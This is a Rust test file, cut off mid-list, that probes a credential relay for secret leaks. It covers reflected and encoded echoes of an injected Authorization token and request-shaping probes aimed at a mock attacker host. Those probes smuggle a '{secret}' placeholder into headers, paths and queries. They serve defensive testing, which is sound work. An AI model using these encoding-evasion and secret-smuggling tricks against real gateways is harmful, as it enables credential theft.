//! Fast tier of the S6 adversarial gate (tasks 5.1 and 5.2 of change s6-adversarial-gate-1,
//! design decisions 1, 3 and 5).
//!
//! The G2 (reflection), G3 (header echo and request shaping) and G4 (encodings) payloads of
//! `tests/adversarial/gateway/G*.sh` replayed against the in-process relay: the harness of this
//! file's parent (fake KMS and material, wiremock provider and attacker host), no Docker and no
//! network. The secret is the oracle's own canary, so the independent judge applies: everything
//! the caller received is written to a private temp directory and scanned with
//! `python3 -I tests/kit/oracle.py scan`, never with `ls-redact`.
//!
//! The scan result is judged against `tests/adversarial/gateway/residuals.toml` with the rules of
//! `tests/adversarial/run.sh`: a hit not listed for its case (and file) fails, a listed hit is a
//! RESIDUAL (the test passes), a listed entry (or listed file) with no hit is a STALE RESIDUAL and
//! fails. The artifact names mirror the stack tier (`smith-enc-FORM.out`, `mcp-enc-FORM.view`,
//! `mcp-enc.out`) so the same register applies. Neither the canary nor any encoding of it is ever
//! printed by these tests.

use super::*;
use std::collections::HashMap;
use std::io::{Read, Write};
use std::net::TcpStream;
use std::path::{Path, PathBuf};
use std::process::Command;
use wiremock::matchers::any;
use wiremock::{Request as WmRequest, Respond};

// ---------------------------------------------------------------------------------------------
// Work directory, canary and oracle
// ---------------------------------------------------------------------------------------------

fn repo_file(rel: &str) -> PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("../..")
        .join(rel)
}

/// A private temp directory holding the canary and the artifacts of one case.
struct Work {
    dir: PathBuf,
    artifacts: PathBuf,
    canary: String,
    canary_file: PathBuf,
}

impl Work {
    fn new() -> Self {
        let dir = std::env::temp_dir().join(format!("ls-adversarial-{}", Uuid::new_v4()));
        let artifacts = dir.join("artifacts");
        let mut b = std::fs::DirBuilder::new();
        b.recursive(true);
        #[cfg(unix)]
        std::os::unix::fs::DirBuilderExt::mode(&mut b, 0o700);
        b.create(&artifacts).expect("create work dir");
        let out = Command::new("python3")
            .args(["-I"])
            .arg(repo_file("tests/kit/oracle.py"))
            .arg("gen")
            .output()
            .expect("python3 is required for the adversarial tests");
        assert!(out.status.success(), "oracle gen failed");
        let canary = String::from_utf8(out.stdout).unwrap().trim().to_owned();
        assert!(canary.len() >= 40, "unexpected canary shape");
        let canary_file = dir.join("canary");
        std::fs::write(&canary_file, format!("{canary}\n")).unwrap();
        Self {
            dir,
            artifacts,
            canary,
            canary_file,
        }
    }

    fn value(&self) -> Vec<u8> {
        self.canary.as_bytes().to_vec()
    }

    /// The text a caller would put in an `Authorization` header (the injected value).
    fn injected(&self) -> String {
        format!("Bearer {}", self.canary)
    }

    fn save(&self, name: &str, bytes: &[u8]) {
        std::fs::write(self.artifacts.join(name), bytes).unwrap();
    }

    /// `python3 -I oracle.py scan` over the artifacts; its output (never the canary) on exit 0
    /// or 1. Anything else (an oracle error) fails the test.
    fn scan(&self) -> String {
        let out = Command::new("python3")
            .arg("-I")
            .arg(repo_file("tests/kit/oracle.py"))
            .arg("scan")
            .arg("--canary-file")
            .arg(&self.canary_file)
            .arg(&self.artifacts)
            .output()
            .expect("python3 is required for the adversarial tests");
        let mut text = String::from_utf8_lossy(&out.stdout).into_owned();
        text.push_str(&String::from_utf8_lossy(&out.stderr));
        let code = out.status.code();
        assert!(
            matches!(code, Some(0) | Some(1)),
            "oracle scan failed (exit {code:?}): {text}"
        );
        text
    }

    /// Scan, judge against the register for `case`, and fail on an unlisted leak or a stale
    /// residual.
    fn judge(&self, case: &str) {
        let scan = self.scan();
        let v = judge(&Register::load(), case, &scan, &self.artifacts);
        for (enc, label) in &v.residual {
            eprintln!("RESIDUAL {case} {enc} ({label})");
        }
        assert!(
            v.unlisted.is_empty(),
            "{case}: unlisted leak(s) (encoding, file): {:?}",
            v.unlisted
        );
        assert!(
            v.stale.is_empty(),
            "{case}: STALE RESIDUAL (registered, no hit): {:?}",
            v.stale
        );
    }
}

impl Drop for Work {
    fn drop(&mut self) {
        if std::env::var_os("ADVERSARIAL_KEEP").is_some() {
            eprintln!("kept: {}", self.dir.display());
        } else {
            let _ = std::fs::remove_dir_all(&self.dir);
        }
    }
}

// ---------------------------------------------------------------------------------------------
// Residual register (tests/adversarial/gateway/residuals.toml), the rules of run.sh `judge`
// ---------------------------------------------------------------------------------------------

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct Entry {
    case: String,
    encoding: String,
    label: String,
    #[allow(dead_code)]
    reason: String,
    artifacts: Option<Vec<String>>,
}

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct Register {
    #[serde(default)]
    residual: Vec<Entry>,
}

impl Register {
    fn load() -> Self {
        let text = std::fs::read_to_string(repo_file("tests/adversarial/gateway/residuals.toml"))
            .expect("read residuals.toml");
        let reg: Register = toml::from_str(&text).expect("residuals.toml is invalid");
        for (n, e) in reg.residual.iter().enumerate() {
            let n = n + 1;
            assert!(
                [&e.case, &e.encoding, &e.label, &e.reason]
                    .iter()
                    .all(|s| !s.trim().is_empty()),
                "residual entry {n}: an empty field"
            );
            assert!(
                e.case.len() >= 2
                    && e.case.starts_with('G')
                    && e.case.as_bytes()[1].is_ascii_digit(),
                "residual entry {n}: `{}` is not a gateway case id",
                e.case
            );
            assert!(
                !e.encoding.contains('*') && !e.encoding.contains(' '),
                "residual entry {n}: encoding must be an oracle label, no wildcards"
            );
            assert!(
                ["prevention", "containment", "detection"].contains(&e.label.as_str()),
                "residual entry {n}: bad label"
            );
            if let Some(a) = &e.artifacts {
                assert!(
                    !a.is_empty() && a.iter().all(|f| !f.contains('*')),
                    "residual entry {n}: bad `artifacts`"
                );
            }
        }
        reg
    }
}

#[derive(Default)]
struct Verdict {
    /// (oracle label, register label)
    residual: Vec<(String, String)>,
    /// (oracle label, file)
    unlisted: Vec<(String, String)>,
    /// `encoding` or `encoding file`
    stale: Vec<String>,
}

/// An oracle label is `<view>/.../<name>[+<name>...]`: encodings with the same needle share one
/// label. An entry matches the whole label, or the view path with one of the names.
fn label_forms(label: &str) -> Vec<String> {
    let (prefix, names) = match label.rsplit_once('/') {
        Some((views, names)) => (format!("{views}/"), names),
        None => (String::new(), label),
    };
    let mut out = vec![label.to_owned()];
    out.extend(names.split('+').map(|n| format!("{prefix}{n}")));
    out
}

fn judge(reg: &Register, case: &str, scan: &str, adir: &Path) -> Verdict {
    let mine: Vec<&Entry> = reg.residual.iter().filter(|e| e.case == case).collect();
    let mut hits: Vec<(String, String)> = Vec::new();
    for line in scan.lines() {
        let parts: Vec<&str> = line.split_whitespace().collect();
        if parts.len() >= 3 && parts[0] == "LEAK" {
            let path = parts[2].rsplit_once(':').map_or(parts[2], |(p, _)| p);
            let path = Path::new(path)
                .strip_prefix(adir)
                .map_or_else(|_| path.to_owned(), |r| r.to_string_lossy().into_owned());
            let hit = (parts[1].to_owned(), path);
            if !hits.contains(&hit) {
                hits.push(hit);
            }
        }
    }
    let mut v = Verdict::default();
    let mut used: Vec<(usize, Option<String>)> = Vec::new();
    for (label, path) in &hits {
        let f = label_forms(label);
        let matched: Vec<usize> = mine
            .iter()
            .enumerate()
            .filter(|(_, e)| {
                f.contains(&e.encoding)
                    && e.artifacts
                        .as_ref()
                        .is_none_or(|a| a.iter().any(|x| x == path))
            })
            .map(|(i, _)| i)
            .collect();
        if matched.is_empty() {
            v.unlisted.push((label.clone(), path.clone()));
            continue;
        }
        for &i in &matched {
            used.push((i, mine[i].artifacts.as_ref().map(|_| path.clone())));
        }
        if !v.residual.iter().any(|(l, _)| l == label) {
            v.residual
                .push((label.clone(), mine[matched[0]].label.clone()));
        }
    }
    for (i, e) in mine.iter().enumerate() {
        match &e.artifacts {
            Some(files) => {
                for file in files {
                    if !used.contains(&(i, Some(file.clone()))) {
                        v.stale.push(format!("{} {file}", e.encoding));
                    }
                }
            }
            None => {
                if !used.contains(&(i, None)) {
                    v.stale.push(e.encoding.clone());
                }
            }
        }
    }
    v
}

// ---------------------------------------------------------------------------------------------
// Encoding helpers
// ---------------------------------------------------------------------------------------------

fn crc32(data: &[u8]) -> u32 {
    let mut crc = !0u32;
    for &b in data {
        crc ^= u32::from(b);
        for _ in 0..8 {
            crc = if crc & 1 == 1 {
                (crc >> 1) ^ 0xEDB8_8320
            } else {
                crc >> 1
            };
        }
    }
    !crc
}

/// A valid gzip member holding `data` as one fixed-Huffman deflate block of literals (no new
/// crate). Unlike a stored block, the bytes are bit-packed, so the text is not visible in them.
fn gzip_stored(data: &[u8]) -> Vec<u8> {
    struct Bits {
        out: Vec<u8>,
        acc: u32,
        n: u32,
    }
    impl Bits {
        /// `n` bits of `v`, least significant first (block headers).
        fn put(&mut self, v: u32, n: u32) {
            self.acc |= v << self.n;
            self.n += n;
            while self.n >= 8 {
                self.out.push((self.acc & 0xff) as u8);
                self.acc >>= 8;
                self.n -= 8;
            }
        }

        /// A Huffman code of `n` bits, most significant first.
        fn code(&mut self, v: u32, n: u32) {
            for i in (0..n).rev() {
                self.put((v >> i) & 1, 1);
            }
        }
    }
    let mut bits = Bits {
        out: Vec::new(),
        acc: 0,
        n: 0,
    };
    bits.put(1, 1); // BFINAL
    bits.put(1, 2); // BTYPE 01: fixed Huffman
    for &b in data {
        let b = u32::from(b);
        if b < 144 {
            bits.code(0x30 + b, 8);
        } else {
            bits.code(0x190 + (b - 144), 9);
        }
    }
    bits.code(0, 7); // end of block
    if bits.n > 0 {
        bits.put(0, 8 - bits.n);
    }
    let mut out = vec![0x1f, 0x8b, 8, 0, 0, 0, 0, 0, 0, 0xff];
    out.extend_from_slice(&bits.out);
    out.extend_from_slice(&crc32(data).to_le_bytes());
    out.extend_from_slice(&(data.len() as u32).to_le_bytes());
    out
}

fn base32(data: &[u8], lower: bool, pad: bool) -> String {
    const A: &[u8; 32] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
    let mut out = String::new();
    for g in data.chunks(5) {
        let mut n = 0u64;
        for i in 0..5 {
            n = (n << 8) | u64::from(*g.get(i).unwrap_or(&0));
        }
        let chars = (g.len() * 8).div_ceil(5);
        for i in 0..8 {
            if i < chars {
                let c = A[((n >> (35 - 5 * i)) & 31) as usize] as char;
                out.push(if lower { c.to_ascii_lowercase() } else { c });
            } else if pad {
                out.push('=');
            }
        }
    }
    out
}

type Headers = Vec<(String, String)>;

/// One G4 encoding of the credential: (extra headers, content type, body).
fn g4_form(form: &str, cred: &str) -> Option<(Headers, String, Vec<u8>)> {
    let raw = cred.as_bytes();
    let text = "text/plain; charset=utf-8".to_owned();
    let mut line = raw.to_vec();
    line.push(b'\n');
    Some(match form {
        "plain" => (vec![], text, line),
        "b32" => (
            vec![],
            text,
            format!("{}\n", base32(raw, false, true)).into_bytes(),
        ),
        "b32-lower" => (
            vec![],
            text,
            format!("{}\n", base32(raw, true, false)).into_bytes(),
        ),
        "utf16le" => (
            vec![],
            "text/plain; charset=utf-16-le".into(),
            raw.iter().flat_map(|&b| [b, 0]).collect(),
        ),
        "utf16be" => (
            vec![],
            "text/plain; charset=utf-16-be".into(),
            raw.iter().flat_map(|&b| [0, b]).collect(),
        ),
        "json-u" => {
            let esc: String = raw.iter().map(|b| format!("\\u{b:04x}")).collect();
            (
                vec![],
                "application/json".into(),
                format!("{{\"token\":\"{esc}\"}}\n").into_bytes(),
            )
        }
        "html-dec" => {
            let e: String = raw.iter().map(|b| format!("&#{b};")).collect();
            (
                vec![],
                "text/html".into(),
                format!("<p>{e}</p>\n").into_bytes(),
            )
        }
        "html-hex" => {
            let e: String = raw.iter().map(|b| format!("&#x{b:x};")).collect();
            (
                vec![],
                "text/html".into(),
                format!("<p>{e}</p>\n").into_bytes(),
            )
        }
        "qp" => {
            let enc: Vec<String> = raw.iter().map(|b| format!("={b:02X}")).collect();
            let lines: Vec<String> = enc.chunks(8).map(|c| c.concat()).collect();
            (
                vec![],
                text,
                format!("{}\r\n", lines.join("=\r\n")).into_bytes(),
            )
        }
        "gzip" => (
            vec![],
            "application/octet-stream".into(),
            gzip_stored(&line),
        ),
        "reversed" => {
            let mut r = raw.to_vec();
            r.reverse();
            r.push(b'\n');
            (vec![], text, r)
        }
        "split-headers" => {
            let n = cred.len().div_ceil(4);
            let parts = (0..4)
                .map(|i| {
                    let a = (i * n).min(cred.len());
                    let b = ((i + 1) * n).min(cred.len());
                    (format!("x-part-{}", i + 1), cred[a..b].to_owned())
                })
                .collect();
            (parts, text, b"ok\n".to_vec())
        }
        "char-lines" => {
            let lines: Vec<String> = cred.chars().map(String::from).collect();
            (vec![], text, format!("{}\n", lines.join("\n")).into_bytes())
        }
        _ => return None,
    })
}

const G4_FORMS: [&str; 13] = [
    "plain",
    "b32",
    "b32-lower",
    "utf16le",
    "utf16be",
    "json-u",
    "html-dec",
    "html-hex",
    "qp",
    "gzip",
    "reversed",
    "split-headers",
    "char-lines",
];

// ---------------------------------------------------------------------------------------------
// The reflecting provider (the in-process twin of fixtures/http_upstream.py `api`)
// ---------------------------------------------------------------------------------------------

/// One header value in every encoding an echo could use.
fn echo_forms(name: &str, value: &str) -> Vec<String> {
    let mut lines = vec![
        format!("{name}: {value}"),
        format!("{name}.b64: {}", B64.encode(value)),
        format!("{name}.b64url: {}", URL_SAFE.encode(value)),
        format!("{name}.hex: {}", hex(value.as_bytes())),
        format!("{name}.pct: {}", percent(value.as_bytes())),
    ];
    if name.eq_ignore_ascii_case("authorization") {
        let (scheme, cred) = value.split_once(' ').unwrap_or((value, ""));
        lines.push(format!("auth.scheme: {scheme}"));
        lines.push(format!("auth.credential: {cred}"));
    }
    lines
}

/// The reflected request, as the fixture's body text.
fn reflect_text(method: &str, target: &str, headers: &[(String, String)], body: &[u8]) -> String {
    let mut lines = vec![
        "role: api".to_owned(),
        format!("request: {method} {target}"),
    ];
    for (k, v) in headers {
        lines.extend(echo_forms(k, v));
    }
    lines.push(format!("body: {}", String::from_utf8_lossy(body)));
    let json: HashMap<&String, &String> = headers.iter().map(|(k, v)| (k, v)).collect();
    lines.push(format!("json: {}", serde_json::to_string(&json).unwrap()));
    lines.join("\n") + "\n"
}

/// The response headers that echo the injected credential.
fn echo_headers(auth: &str) -> Vec<(String, String)> {
    vec![
        ("x-echo-authorization".into(), auth.to_owned()),
        ("x-echo-authorization-b64".into(), B64.encode(auth)),
        (
            "set-cookie".into(),
            format!("session={}; Path=/", percent(auth.as_bytes())),
        ),
        (
            "www-authenticate".into(),
            format!("Bearer error=\"invalid_token\", token=\"{auth}\""),
        ),
    ]
}

fn request_headers(req: &WmRequest) -> Headers {
    req.headers
        .iter()
        .map(|(k, v)| {
            (
                k.as_str().to_owned(),
                String::from_utf8_lossy(v.as_bytes()).into_owned(),
            )
        })
        .collect()
}

/// wiremock responder: reflects the request, or answers the `g4`, `enc`, `dup` and `redirect`
/// query modes of the fixture.
struct Provider;

impl Respond for Provider {
    fn respond(&self, req: &WmRequest) -> ResponseTemplate {
        let q: HashMap<String, String> = req.url.query_pairs().into_owned().collect();
        let headers = request_headers(req);
        let auth = headers
            .iter()
            .find(|(k, _)| k == "authorization")
            .map(|(_, v)| v.clone())
            .unwrap_or_default();
        if let Some(form) = q.get("g4") {
            let cred = auth.split_once(' ').map_or("", |(_, c)| c);
            let Some((extra, ctype, body)) = g4_form(form, cred) else {
                return ResponseTemplate::new(400);
            };
            let mut t = ResponseTemplate::new(200).insert_header("content-type", ctype.as_str());
            for (k, v) in &extra {
                t = t.insert_header(k.as_str(), v.as_str());
            }
            return t.set_body_bytes(body);
        }
        let target = match req.url.query() {
            Some(qs) => format!("{}?{qs}", req.url.path()),
            None => req.url.path().to_owned(),
        };
        let text = reflect_text(req.method.as_str(), &target, &headers, &req.body).into_bytes();
        let mut t =
            ResponseTemplate::new(200).insert_header("content-type", "text/plain; charset=utf-8");
        if let Some(code) = q.get("redirect").and_then(|c| c.parse::<u16>().ok()) {
            t = ResponseTemplate::new(code)
                .insert_header("content-type", "text/plain; charset=utf-8");
            t = t.insert_header("location", q.get("to").map_or("/", String::as_str));
        }
        for (k, v) in echo_headers(&auth) {
            t = t.insert_header(k.as_str(), v.as_str());
        }
        let mut body = text;
        if let Some(enc) = q.get("enc") {
            // The relay refuses a Content-Encoding it cannot scan before it reads the body, so
            // one stored gzip member stands in for every coding (and is stacked for `a,b`).
            for _ in enc.split(',') {
                body = gzip_stored(&body);
            }
            t = t.insert_header("content-encoding", enc.replace(',', ", ").as_str());
        }
        if q.contains_key("dup") {
            body = gzip_stored(&gzip_stored(&body));
            t = t
                .append_header("content-encoding", "gzip")
                .append_header("content-encoding", "gzip");
        }
        t.set_body_bytes(body)
    }
}

async fn mount_provider(server: &MockServer) {
    Mock::given(any())
        .respond_with(Provider)
        .mount(server)
        .await;
}

/// A raw HTTP/1.1 provider on `port` for the bodies wiremock's hyper would rewrite or buffer:
/// `te=gzip` (Transfer-Encoding gzip, chunked), `split=1` (one byte per chunk) and `sse=1` (an
/// event stream in pieces). It records every `Authorization` header it receives.
fn raw_provider(port: u16, seen: Arc<Mutex<Vec<String>>>) {
    let listener = std::net::TcpListener::bind(("127.0.0.1", port)).unwrap();
    std::thread::spawn(move || {
        for stream in listener.incoming() {
            let Ok(stream) = stream else { return };
            let seen = seen.clone();
            std::thread::spawn(move || serve_raw(stream, &seen));
        }
    });
}

fn serve_raw(mut stream: TcpStream, seen: &Mutex<Vec<String>>) {
    let mut req = Vec::new();
    let mut buf = [0u8; 1024];
    while !req.windows(4).any(|w| w == b"\r\n\r\n") {
        match stream.read(&mut buf) {
            Ok(0) | Err(_) => return,
            Ok(n) => req.extend_from_slice(&buf[..n]),
        }
    }
    let head = String::from_utf8_lossy(&req).into_owned();
    let mut lines = head.split("\r\n");
    let target = lines
        .next()
        .and_then(|l| l.split(' ').nth(1))
        .unwrap_or("/")
        .to_owned();
    let headers: Headers = lines
        .filter_map(|l| l.split_once(": "))
        .map(|(k, v)| (k.to_ascii_lowercase(), v.to_owned()))
        .collect();
    let auth = headers
        .iter()
        .find(|(k, _)| k == "authorization")
        .map(|(_, v)| v.clone())
        .unwrap_or_default();
    seen.lock().unwrap().push(auth.clone());
    let text = reflect_text("GET", &target, &headers, b"").into_bytes();
    let (ctype, te, body, step, pause) = if target.contains("te=gzip") {
        (
            "text/plain",
            "gzip, chunked",
            gzip_stored(&text),
            usize::MAX,
            false,
        )
    } else if target.contains("sse=1") {
        ("text/event-stream", "chunked", text, 29, true)
    } else {
        ("text/plain", "chunked", text, 1, true)
    };
    let mut out = format!("HTTP/1.1 200 OK\r\ncontent-type: {ctype}\r\n");
    for (k, v) in echo_headers(&auth) {
        out.push_str(&format!("{k}: {v}\r\n"));
    }
    out.push_str(&format!(
        "transfer-encoding: {te}\r\nconnection: close\r\n\r\n"
    ));
    if stream.write_all(out.as_bytes()).is_err() {
        return;
    }
    for (i, part) in body.chunks(step.min(body.len().max(1))).enumerate() {
        let mut chunk = format!("{:x}\r\n", part.len()).into_bytes();
        chunk.extend_from_slice(part);
        chunk.extend_from_slice(b"\r\n");
        if stream.write_all(&chunk).is_err() || stream.flush().is_err() {
            return;
        }
        // Pauses make the relay see the key split across reads.
        if pause && (step > 1 || i % 64 == 0) {
            std::thread::sleep(Duration::from_millis(5));
        }
    }
    let _ = stream.write_all(b"0\r\n\r\n");
}

fn options() -> RelayOptions {
    RelayOptions {
        connect_timeout: Duration::from_secs(2),
        timeout: Duration::from_secs(20),
        max_request_body: 64 * 1024,
        max_response_body: 64 * 1024,
        outcome_retries: 3,
        outcome_retry_backoff: Duration::from_millis(1),
    }
}

async fn adversarial_harness(w: &Work) -> Harness {
    harness(Setup {
        value: w.value(),
        options: options(),
        ..Setup::default()
    })
    .await
}

// ---------------------------------------------------------------------------------------------
// What the caller received
// ---------------------------------------------------------------------------------------------

/// The JSON part of a raw response (after the header lines the harness prepends).
fn json_part(raw: &[u8]) -> &[u8] {
    raw.iter()
        .position(|&b| b == b'{')
        .map_or(&raw[raw.len()..], |s| &raw[s..])
}

/// What `smith relay --show all` prints (and the decoded MCP tool result): the status, the
/// headers and the body bytes as the agent reads them.
fn view(raw: &[u8]) -> Vec<u8> {
    let Ok(env) = serde_json::from_slice::<RelayResponse>(json_part(raw)) else {
        return raw.to_vec();
    };
    let mut out = format!("HTTP {}\n", env.status).into_bytes();
    for (k, v) in &env.headers {
        out.extend_from_slice(format!("{k}: {v}\n").as_bytes());
    }
    out.push(b'\n');
    match (env.body, env.body_base64) {
        (Some(t), _) => out.extend_from_slice(t.as_bytes()),
        (None, Some(b)) => out.extend_from_slice(&B64.decode(b).unwrap_or_default()),
        _ => {}
    }
    out
}

/// The JSON-RPC reply an MCP client reads for a `relay_request` call: the gateway's JSON inside
/// the text of the tool result, so it is escaped twice.
fn mcp_line(id: usize, status: StatusCode, raw: &[u8]) -> Vec<u8> {
    let text = String::from_utf8_lossy(json_part(raw)).into_owned();
    let mut line = serde_json::to_vec(&serde_json::json!({
        "jsonrpc": "2.0",
        "id": id,
        "result": { "content": [{ "type": "text", "text": text }], "isError": !status.is_success() },
    }))
    .unwrap();
    line.push(b'\n');
    line
}

/// Collects one case's calls into the stack tier's artifact names.
struct Capture2 {
    group: &'static str,
    mcp_wire: Vec<u8>,
    calls: usize,
    refused: usize,
}

impl Capture2 {
    fn new(group: &'static str) -> Self {
        Self {
            group,
            mcp_wire: Vec::new(),
            calls: 0,
            refused: 0,
        }
    }

    /// Record one relayed call under `name`; returns whether it was relayed (not refused).
    fn record(&mut self, w: &Work, name: &str, status: StatusCode, raw: &[u8]) -> bool {
        self.calls += 1;
        let v = view(raw);
        let g = self.group;
        w.save(&format!("smith-{g}-{name}.out"), &v);
        w.save(&format!("mcp-{g}-{name}.view"), &v);
        self.mcp_wire.extend(mcp_line(self.calls, status, raw));
        let body = String::from_utf8_lossy(raw);
        if status == StatusCode::OK {
            true
        } else {
            assert_eq!(status, StatusCode::BAD_GATEWAY, "{name}: unexpected status");
            assert!(
                body.contains("response_withheld"),
                "{name}: not response_withheld"
            );
            self.refused += 1;
            false
        }
    }

    fn finish(&self, w: &Work) {
        w.save(&format!("mcp-{}.out", self.group), &self.mcp_wire);
    }
}

/// Every relayed or refused call has one `relay.outcome`, every refusal is `redaction_failed`,
/// and the ledger holds no attempt without an outcome.
fn assert_ledger(h: &Harness, calls: usize, refused: usize) {
    let outcomes = h.outcomes();
    assert_eq!(outcomes.len(), calls, "one outcome per call");
    assert_eq!(
        outcomes
            .iter()
            .filter(|o| **o == "redaction_failed")
            .count(),
        refused,
        "a redaction_failed event per refusal"
    );
    assert_eq!(
        outcomes.iter().filter(|o| **o == "ok").count(),
        calls - refused,
        "an ok event per relayed reply"
    );
    h.assert_attempts_closed();
}

fn assert_key_in_bound_header_only(w: &Work, reqs: &[WmRequest]) {
    for r in reqs {
        let auth: Vec<_> = r.headers.get_all("authorization").iter().collect();
        assert_eq!(auth.len(), 1, "authorization sent once");
        assert!(
            auth[0].as_bytes() == w.injected().as_bytes(),
            "injected authorization differs"
        );
        assert_key_nowhere_else(w, r);
    }
}

fn assert_key_nowhere_else(w: &Work, r: &WmRequest) {
    let c = w.canary.as_bytes();
    let has = |hay: &[u8]| hay.windows(c.len()).any(|x| x == c);
    for (k, v) in r.headers.iter() {
        if k.as_str() != "authorization" {
            assert!(!has(v.as_bytes()), "key in header {k}");
        }
    }
    let url = r.url.as_str();
    assert!(!has(url.as_bytes()), "key in the URL");
    assert!(
        !has(percent_decode(url).as_bytes()),
        "key in the decoded URL"
    );
    assert!(!has(&r.body), "key in the request body");
}

fn percent_decode(s: &str) -> String {
    let b = s.as_bytes();
    let mut out = Vec::new();
    let mut i = 0;
    while i < b.len() {
        if b[i] == b'%'
            && i + 2 < b.len()
            && let Ok(v) = u8::from_str_radix(&s[i + 1..i + 3], 16)
        {
            out.push(v);
            i += 3;
        } else {
            out.push(b[i]);
            i += 1;
        }
    }
    String::from_utf8_lossy(&out).into_owned()
}

// ---------------------------------------------------------------------------------------------
// The cases
// ---------------------------------------------------------------------------------------------

/// The register parses and names only gateway cases.
#[test]
fn register_loads() {
    let reg = Register::load();
    assert!(reg.residual.iter().any(|e| e.case == "G4"));
}

/// G2, reflection: the provider reflects the injected header in many encodings, in the response
/// headers and body, through every body framing and coding the fixture has.
#[tokio::test]
async fn g2_reflection() {
    let w = Work::new();
    let h = adversarial_harness(&w).await;
    mount_provider(&h.upstream).await;
    let seen = Arc::new(Mutex::new(Vec::new()));
    raw_provider(h.dead_port, seen.clone());
    let upstream = h.origin();
    let raw_origin = h.dead_origin();

    // (name, origin, query, must be refused)
    let modes: [(&str, &str, &str, bool); 11] = [
        ("plain", &upstream, "", false),
        ("post", &upstream, "", false),
        ("enc-gzip", &upstream, "?enc=gzip", true),
        ("enc-deflate", &upstream, "?enc=deflate", true),
        ("enc-br", &upstream, "?enc=br", true),
        ("enc-zstd", &upstream, "?enc=zstd", true),
        ("enc-gzip-gzip", &upstream, "?enc=gzip,gzip", true),
        ("dup-1", &upstream, "?dup=1", true),
        ("te-gzip", &raw_origin, "?te=gzip", true),
        ("split-1", &raw_origin, "?split=1", false),
        ("sse-1", &raw_origin, "?sse=1", false),
    ];
    let mut cap = Capture2::new("reflect");
    let mut upstream_calls = 0;
    for (name, origin, q, must_refuse) in modes {
        let secret = if origin == raw_origin { DEAD } else { SECRET };
        let url = format!("{origin}/g2/{name}{q}");
        let body = if name == "post" {
            serde_json::json!({ "secret_id": secret, "version": 1, "method": "POST", "url": url, "body": "g2 body" })
        } else {
            serde_json::json!({ "secret_id": secret, "version": 1, "method": "GET", "url": url })
        };
        let (status, raw) = h.call(Some(h.token.as_str()), body).await;
        let relayed = cap.record(&w, name, status, &raw);
        assert_eq!(relayed, !must_refuse, "{name}: wrong disposition");
        if relayed {
            let env = envelope(&raw);
            let text = String::from_utf8_lossy(&view(&raw)).into_owned();
            assert!(text.contains("[REDACTED"), "{name}: no redaction marker");
            assert_eq!(env.status, 200);
        }
        if origin == upstream {
            upstream_calls += 1;
        }
    }
    cap.finish(&w);

    // The provider received the key on every call, in the bound header only.
    let reqs = h.upstream.received_requests().await.unwrap();
    assert_eq!(reqs.len(), upstream_calls);
    assert_key_in_bound_header_only(&w, &reqs);
    let seen = seen.lock().unwrap();
    assert_eq!(seen.len(), modes.len() - upstream_calls);
    assert!(seen.iter().all(|a| *a == w.injected()));

    assert_ledger(&h, cap.calls, cap.refused);
    assert!(cap.refused >= 6, "labelled codings are withheld");
    w.judge("G2");
}

/// G4, encodings: the provider returns only the credential, one form per call.
#[tokio::test]
async fn g4_encodings() {
    let w = Work::new();
    let h = adversarial_harness(&w).await;
    mount_provider(&h.upstream).await;
    let mut cap = Capture2::new("enc");
    for form in G4_FORMS {
        let url = format!("{}/g4/relay?g4={form}", h.origin());
        let (status, raw) = h.relay_get(SECRET, &url).await;
        cap.record(&w, form, status, &raw);
        if form == "plain" {
            // The control: redaction is on, so a leak in another form is a form the redactor
            // does not know, not a broken binding.
            assert_eq!(status, StatusCode::OK);
            assert!(
                String::from_utf8_lossy(&view(&raw)).contains("[REDACTED"),
                "the plain control reply was not redacted"
            );
        }
    }
    cap.finish(&w);

    let reqs = h.upstream.received_requests().await.unwrap();
    assert_eq!(reqs.len(), G4_FORMS.len());
    assert_key_in_bound_header_only(&w, &reqs);
    assert_ledger(&h, cap.calls, cap.refused);
    w.judge("G4");
}

/// What a G3 probe must get back.
#[derive(Clone, Copy, PartialEq, Debug)]
enum Class {
    /// 200 from the gateway, upstream 2xx, the key reached the provider in the bound header.
    Ok,
    /// 200 from the gateway carrying the upstream 3xx, not followed.
    Redirect,
    /// 400 `bad_request`, nothing sent.
    Bad,
    /// 403 `denied`, nothing decrypted or sent.
    Denied,
}

struct Probe {
    name: String,
    class: Class,
    method: String,
    url: String,
    headers: Vec<(String, String)>,
    body: Option<String>,
}

fn probe(name: &str, class: Class, url: &str) -> Probe {
    Probe {
        name: name.to_owned(),
        class,
        method: "GET".into(),
        url: url.to_owned(),
        headers: vec![],
        body: None,
    }
}

impl Probe {
    fn headers(mut self, h: &[(&str, &str)]) -> Self {
        self.headers = h.iter().map(|(k, v)| ((*k).into(), (*v).into())).collect();
        self
    }

    fn method(mut self, m: &str) -> Self {
        self.method = m.into();
        self
    }

    fn body(mut self, b: &str) -> Self {
        self.body = Some(b.into());
        self
    }
}

/// G3, header echo and request shaping: HTTP semantics, not a fuzzer. The attacker's host must
/// receive nothing; requests outside the binding are refused `denied` before any decrypt.
#[tokio::test]
async fn g3_request_shaping() {
    let w = Work::new();
    let h = adversarial_harness(&w).await;
    mount_provider(&h.upstream).await;
    let evil = MockServer::start().await;
    let api = h.origin();
    let api_port = h.upstream.address().port();
    let evil_origin = evil.uri();
    let evil_port = evil.address().port();
    let evil_host = format!("127.0.0.1:{evil_port}");

    let mut probes = vec![
        // Injected header: override, duplicate, re-cased.
        probe("override", Class::Ok, &format!("{api}/g3/override"))
            .headers(&[("Authorization", "Bearer attacker-override")]),
        probe("duplicate", Class::Ok, &format!("{api}/g3/duplicate")).headers(&[
            ("Authorization", "Bearer dup-one"),
            ("Authorization", "Bearer dup-two"),
        ]),
        probe("recased", Class::Ok, &format!("{api}/g3/recased")).headers(&[
            ("AUTHORIZATION", "Bearer upper"),
            ("aUtHoRiZaTiOn", "Bearer mixed"),
        ]),
        probe("proxy-auth", Class::Ok, &format!("{api}/g3/proxy-auth"))
            .headers(&[("Proxy-Authorization", "Bearer {secret}")]),
        // The placeholder in the agent's own input.
        probe("ph-header", Class::Ok, &format!("{api}/g3/ph-header"))
            .headers(&[("X-Leak", "{secret}"), ("X-Leak-Bearer", "Bearer {secret}")]),
        probe(
            "ph-path",
            Class::Ok,
            &format!("{api}/g3/ph-path/{{secret}}"),
        ),
        probe(
            "ph-query",
            Class::Ok,
            &format!("{api}/g3/ph-query?k={{secret}}&auth=Bearer%20{{secret}}"),
        ),
